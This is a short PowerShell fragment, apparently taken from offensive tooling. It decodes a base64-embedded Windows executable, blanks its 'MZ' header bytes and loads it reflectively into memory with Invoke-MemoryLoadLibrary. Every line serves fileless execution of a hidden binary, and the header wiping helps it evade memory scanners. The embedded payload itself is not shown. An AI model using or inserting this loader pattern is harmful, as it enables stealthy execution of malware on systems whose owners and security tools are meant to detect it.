[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
$PEBytes[0] = 0
$PEBytes[1] = 0
$Loaded = Invoke-MemoryLoadLibrary -PEBytes $PEBytes
